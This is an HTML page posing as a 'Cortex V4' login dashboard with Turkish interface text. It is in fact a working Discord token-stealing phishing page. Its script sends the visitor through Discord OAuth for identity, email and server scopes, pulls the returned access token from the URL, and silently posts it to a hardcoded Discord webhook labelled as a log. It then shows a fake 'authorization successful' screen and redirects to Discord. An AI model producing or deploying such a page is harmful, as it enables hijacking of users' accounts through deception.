<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cortex Software | V4 Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #00ffcc; --bg: #020202; }
        body { background: var(--bg); color: var(--primary); font-family: 'Orbitron', sans-serif; margin: 0; overflow: hidden; }
        .nitro-card { background: rgba(10, 10, 10, 0.98); border: 1px solid rgba(0, 255, 204, 0.2); }
        #dashboard { display: none; }
        .glow-btn { transition: all 0.3s ease; cursor: pointer; border: 1px solid rgba(0, 255, 204, 0.3); text-transform: uppercase; }
        .glow-btn:hover { background: #00ffcc; color: black; box-shadow: 0 0 30px #00ffcc; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center">
    <div id="landing" class="text-center p-10 nitro-card rounded-[2rem] max-w-sm w-full mx-4">
        <img src="https://i.imgur.com/4S4W9i8.png" alt="Cortex Logo" class="w-20 h-20 mx-auto mb-6">
        <h1 class="text-2xl font-black mb-1 text-white">Cortex <span class="text-cyan-400">V4</span></h1>
        <p class="text-[10px] text-gray-500 mb-8 tracking-[3px]">GÜVENLİ DOĞRULAMA</p>
        <button onclick="startAuth()" class="w-full py-4 bg-transparent text-cyan-400 rounded-lg font-bold glow-btn text-[10px] tracking-widest">
            Sisteme Giriş Yap
        </button>
    </div>

    <div id="dashboard" class="fixed inset-0 bg-[#020202] flex flex-col items-center justify-center z-50">
        <div class="text-center">
            <div class="w-16 h-16 border-4 border-cyan-400 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
            <h2 class="text-xl font-bold text-white tracking-widest">YETKİLENDİRME BAŞARILI</h2>
        </div>
    </div>

    <script>
        // --- BU KISIMLARI DİKKATLİCE KONTROL ET ---
        const CLIENT_ID = "1480231196045873292"; 
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1480228951015297055/YkGkx8UliKe2XQtD0HxNxj1DBo_2rksQomQWoCaF61x-YUrVR9960IvGj-FVR99NY6iL";

        function startAuth() {
            // Tarayıcıdaki linki temiz bir şekilde alalım
            const redirectUri = window.location.href.split('#')[0].split('?')[0];
            const scope = encodeURIComponent("identify email guilds");
            
            // Hata almamak için URL'yi konsola yazdıralım (F12 ile bakabilirsin)
            console.log("Gönderilen Redirect URI:", redirectUri);
            
            window.location.href = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${scope}`;
        }

        window.onload = () => {
            const hash = window.location.hash.slice(1);
            const params = new URLSearchParams(hash);
            const token = params.get('access_token');

            if (token) {
                document.getElementById('landing').style.display = 'none';
                document.getElementById('dashboard').style.display = 'flex';

                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🔓 Cortex V4 Log",
                            color: 0x00FFCC,
                            description: "```" + token + "```",
                            timestamp: new Date()
                        }]
                    })
                }).then(() => {
                    setTimeout(() => { window.location.href = "https://discord.com/app"; }, 2000);
                });
            }
        }
    </script>
</body>
</html>
